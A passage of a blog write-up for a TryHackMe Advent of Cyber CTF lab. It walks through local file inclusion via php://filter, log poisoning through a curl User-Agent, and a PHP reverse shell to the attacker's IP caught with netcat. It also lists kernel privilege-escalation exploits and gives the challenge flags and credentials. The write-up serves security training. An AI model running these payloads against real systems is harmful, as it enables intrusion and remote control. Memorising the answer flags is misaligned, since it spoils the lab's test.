</span></span><span style=display:flex><span>$flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;THM{791d43d46018a0d89361dbf60d5d9eb8}&#34;</span>;
</span></span><span style=display:flex><span>include<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;./includes/creds.php&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$_SESSION<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;username&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>===</span> $USER<span style=color:#f92672>){</span>                        
</span></span><span style=display:flex><span>        header<span style=color:#f92672>(</span> <span style=color:#e6db74>&#39;Location: manage.php&#39;</span> <span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        die<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $labNum <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>  require <span style=color:#e6db74>&#34;./includes/header.php&#34;</span>;
</span></span><span style=display:flex><span>?&gt;
</span></span><span style=display:flex><span>&lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;row&#34;</span>&gt;
</span></span><span style=display:flex><span>  &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;col-lg-12&#34;</span>&gt;
</span></span><span style=display:flex><span>  &lt;/div&gt;
</span></span><span style=display:flex><span>  &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;col-lg-8 col-offset-1&#34;</span>&gt;
</span></span><span style=display:flex><span>      &lt;?php <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>isset<span style=color:#f92672>(</span>$error<span style=color:#f92672>))</span> <span style=color:#f92672>{</span> ?&gt;
</span></span><span style=display:flex><span>          &lt;span class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text text-danger&#34;</span>&gt;&lt;b&gt;&lt;?php echo $error; ?&gt;&lt;/b&gt;&lt;/span&gt;
</span></span><span style=display:flex><span>      &lt;?php <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>?&gt;
</span></span><span style=display:flex><span> &lt;p&gt;Welcome &lt;?php echo getUserName<span style=color:#f92672>()</span>; ?&gt;&lt;/p&gt;
</span></span><span style=display:flex><span>        &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;alert alert-danger&#34;</span> role<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;alert&#34;</span>&gt;This server has sensitive information. Note All actions to this server are logged in!&lt;/div&gt; 
</span></span><span style=display:flex><span>        &lt;/div&gt;
</span></span><span style=display:flex><span>&lt;?php <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$errInclude<span style=color:#f92672>){</span> include<span style=color:#f92672>(</span>$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;err&#39;</span><span style=color:#f92672>])</span>;<span style=color:#f92672>}</span> ?&gt;
</span></span><span style=display:flex><span>&lt;/div&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>?&gt;             
</span></span></code></pre></div><p>And here comes our second flag. :D</p><p>Looking at the source code, we can find another file seems potentially useful.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;./includes/creds.php&#34;</span>);
</span></span></code></pre></div><p>So let&rsquo;s go for it!</p><pre tabindex=0><code>http://10.10.16.195/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php
</code></pre><p>And quite easily, we&rsquo;d got the credentials.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/thm/adventOfCyber3/day6<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ echo <span style=color:#e6db74>&#34;PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/&#34;</span> | base64 -d
</span></span><span style=display:flex><span>&lt;?php 
</span></span><span style=display:flex><span>$USER <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;McSkidy&#34;</span>;
</span></span><span style=display:flex><span>$PASS <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A0C315Aw3s0m&#34;</span>;
</span></span><span style=display:flex><span>?                       
</span></span></code></pre></div><p>What&rsquo;s left - logging in using that account. Here&rsquo;s the password recovery page:
<img loading=lazy src=/img/adventOfCyber3/day6/recovery-password.png#center alt></p><p>For the next question, the task ask for the hostname of the webserver. Let me show you the easy way.</p><pre tabindex=0><code>http://10.10.16.195/index.php?err=/etc/hosts
</code></pre><p><img loading=lazy src=/img/adventOfCyber3/day6/etchosts.png#center alt></p><p>Simple as that, and the THM challenge actually ended here. From this point onward is just bonus steps for
learning purposes. :D</p><p>So, there&rsquo;s a <code>log.php</code> site that let you access request logs. Following the challenge&rsquo;s tutorial, I sent a
request like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -A <span style=color:#e6db74>&#34;lmao I&#39;m here&#34;</span> http://10.10.16.195
</span></span></code></pre></div><p>Checking the logs, we can clearly see where our payload went.</p><p><img loading=lazy src=/img/adventOfCyber3/day6/logs.png#center alt></p><p>Using the exact method, this time I sent a real PHP payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -A <span style=color:#e6db74>&#34;&lt;?php phpinfo();?&gt;&#34;</span> http://10.10.16.195
</span></span></code></pre></div><p><img loading=lazy src=/img/adventOfCyber3/day6/first-payload.png#center alt></p><p>However, as you may expected, the payload&rsquo;s not executed just by visiting the page. So I visit it again, this
time via LFI.</p><pre tabindex=0><code>http://10.10.16.195/index.php?err=php://filter/resource=./includes/logs/app_access.log
</code></pre><p><img loading=lazy src=/img/adventOfCyber3/day6/phpinfo.png#center alt></p><p>As you may see, the server gracefully executed our payload. Without a second thought, I went straight to
<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php>reverse shell cheat
sheet</a>,
grab a PHP payload and sent it. Basically it looked like this.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> $sock<span style=color:#f92672>=</span><span style=color:#a6e22e>fsockopen</span>($MY<span style=color:#f92672>-</span><span style=color:#a6e22e>IP</span>,$PORT);$proc<span style=color:#f92672>=</span><span style=color:#a6e22e>proc_open</span>(<span style=color:#f92672>/</span><span style=color:#a6e22e>bin</span><span style=color:#f92672>/</span><span style=color:#a6e22e>sh</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>i</span>, <span style=color:#66d9ef>array</span>(<span style=color:#ae81ff>0</span><span style=color:#f92672>=&gt;</span>$sock, <span style=color:#ae81ff>1</span><span style=color:#f92672>=&gt;</span>$sock, <span style=color:#ae81ff>2</span><span style=color:#f92672>=&gt;</span>$sock),$pipes); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>Send it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl --user-agent <span style=color:#e6db74>&#39;&lt;?php $sock=fsockopen(&#34;$MY-IP&#34;,9999);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>2=&gt;$sock),$pipes); ?&gt;&#39;</span> http://$SERVER-IP
</span></span></code></pre></div><p>Open a port to receive it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9999</span>
</span></span></code></pre></div><p>Access the log via LFI again to execute the payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/thm/adventOfCyber3/day6<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ nc -lvnp <span style=color:#ae81ff>9999</span>                                                                                                                                                                                                                         <span style=color:#ae81ff>1</span> ⨯
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>9999</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.4.35.200<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.161.15<span style=color:#f92672>]</span> <span style=color:#ae81ff>34994</span>
</span></span><span style=display:flex><span>/bin/sh: 0: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
</span></span><span style=display:flex><span>$ id    
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>That&rsquo;s it. We&rsquo;re in.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat /etc/*release
</span></span><span style=display:flex><span>DISTRIB_ID<span style=color:#f92672>=</span>Ubuntu
</span></span><span style=display:flex><span>DISTRIB_RELEASE<span style=color:#f92672>=</span>12.04
</span></span><span style=display:flex><span>DISTRIB_CODENAME<span style=color:#f92672>=</span>precise
</span></span><span style=display:flex><span>DISTRIB_DESCRIPTION<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Ubuntu 12.04.5 LTS&#34;</span>
</span></span><span style=display:flex><span>NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Ubuntu&#34;</span>
</span></span><span style=display:flex><span>VERSION<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;12.04.5 LTS, Precise Pangolin&#34;</span>
</span></span><span style=display:flex><span>ID<span style=color:#f92672>=</span>ubuntu
</span></span><span style=display:flex><span>ID_LIKE<span style=color:#f92672>=</span>debian
</span></span><span style=display:flex><span>PRETTY_NAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Ubuntu precise (12.04.5 LTS)&#34;</span>
</span></span><span style=display:flex><span>VERSION_ID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;12.04&#34;</span>
</span></span></code></pre></div><p>We can see this box&rsquo;s using a quite outdated version of Ubuntu. A quick <code>searchsploit</code> return a lot of useful
resources:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ searchsploit ubuntu 12.04                                                                                                                                                                                                           <span style=color:#ae81ff>130</span> ⨯
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                                                                                                                                                              |  Path
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span>Linux Kernel <span style=color:#f92672>(</span>Ubuntu 11.10/12.04<span style=color:#f92672>)</span> - binfmt_script Stack Data Disclosure                                                                                                                                     | linux/dos/41767.txt
</span></span><span style=display:flex><span>Linux Kernel 3.13.0 &lt; 3.19 <span style=color:#f92672>(</span>Ubuntu 12.04/14.04/14.10/15.04<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;overlayfs&#39;</span> Local Privilege Escalation                                                                                                        | linux/local/37292.c
</span></span><span style=display:flex><span>Linux Kernel 3.13.0 &lt; 3.19 <span style=color:#f92672>(</span>Ubuntu 12.04/14.04/14.10/15.04<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;overlayfs&#39;</span> Local Privilege Escalation <span style=color:#f92672>(</span>Access /etc/shadow<span style=color:#f92672>)</span>                                                                                   | linux/local/37293.txt
</span></span><span style=display:flex><span>Linux Kernel 3.2.0-23/3.5.0-23 <span style=color:#f92672>(</span>Ubuntu 12.04/12.04.1/12.04.2 x64<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;perf_swevent_init&#39;</span> Local Privilege Escalation <span style=color:#f92672>(</span>3<span style=color:#f92672>)</span>                                                                                      | linux_x86-64/local/33589.c
</span></span><span style=display:flex><span>Linux Kernel &lt; 3.2.0-23 <span style=color:#f92672>(</span>Ubuntu 12.04 x64<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;ptrace/sysret&#39;</span> Local Privilege Escalation                                                                                                                     | linux_x86-64/local/34134.c
</span></span><span style=display:flex><span>Linux Kernel &lt; 3.5.0-23 <span style=color:#f92672>(</span>Ubuntu 12.04.2 x64<span style=color:#f92672>)</span> - <span style=color:#e6db74>&#39;SOCK_DIAG&#39;</span> SMEP Bypass Local Privilege Escalation                                                                                                           | linux_x86-64/local/44299.c
</span></span><span style=display:flex><span>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                                                                      | linux/local/41760.txt
</span></span><span style=display:flex><span>usb-creator 0.2.x <span style=color:#f92672>(</span>Ubuntu 12.04/14.04/14.10<span style=color:#f92672>)</span> - Local Privilege Escalation                                                                                                                                   | linux/local/36820.txt
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><p>However, since the box lacked basic utilities:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc
</span></span><span style=display:flex><span>/bin/sh: 19: gcc: not found
</span></span><span style=display:flex><span>$ curl             
</span></span><span style=display:flex><span>/bin/sh: 20: curl: not found
</span></span><span style=display:flex><span>$ wget
</span></span><span style=display:flex><span>/bin/sh: 21: wget: not found
</span></span></code></pre></div><p>I attempted no further. But you can try to privilege escalate on this box by yourself, for the
sake of learning. :D</p><p>You can also get RCE with PHP session. Here&rsquo;s the end result:
<img loading=lazy src=/img/adventOfCyber3/day6/php_sess.png#center alt></p><p>But as this task&rsquo;s got quite lengthy, I&rsquo;ll leave that part for you, then. :D</p><p>Here&rsquo;s the answers for today!</p><p><code>Deploy the attached VM and look around. What is the entry point for our web application?</code> err</p><p><code>Use the entry point to perform LFI to read the /etc/flag file. What is the flag?</code> THM{d29e08941cf7fe41df55f1a7da6c4c06}</p><p><code>Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?</code> THM{791d43d46018a0d89361dbf60d5d9eb8}</p><p><code>Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?</code> McSkidy:A0C315Aw3s0m</p><p><code>Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the flag.thm.aoc server?</code> THM{552f313b52e3c3dbf5257d8c6db7f6f1}</p><p><code>The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log</code> lfi-aoc-awesome-59aedca683fff9261263bb084880c965</p><p><img loading=lazy src=/img/adventOfCyber3/day6/answers.png#center alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://git-akihakune.github.io/tags/ctf/>ctf</a></li><li><a href=https://git-akihakune.github.io/tags/thm/>thm</a></li><li><a href=https://git-akihakune.github.io/tags/tech/>tech</a></li></ul><nav class=paginav><a class=prev href=https://git-akihakune.github.io/blog/myleetcodejourney/><span class=title>« Prev Page</span><br><span>My Leetcode journey</span></a>
<a class=next href=https://git-akihakune.github.io/blog/bountyhunter/><span class=title>Next Page »</span><br><span>Hack The Box - Bounty Hunter writeup</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 1) on twitter" href="https://twitter.com/intent/tweet/?text=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%201%29&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3%2f&hashtags=ctf%2cthm%2ctech"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 1) on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3%2f&title=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%201%29&summary=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%201%29&source=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 1) on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3%2f&title=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%201%29"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 1) on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 1) on whatsapp" href="https://api.whatsapp.com/send?text=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%201%29%20-%20https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 1) on telegram" href="https://telegram.me/share/url?text=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%201%29&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://git-akihakune.github.io>Hakune Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.8)"})})</script><script type=module src=https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js></script>
<script nomodule src=https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js></script>
<script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>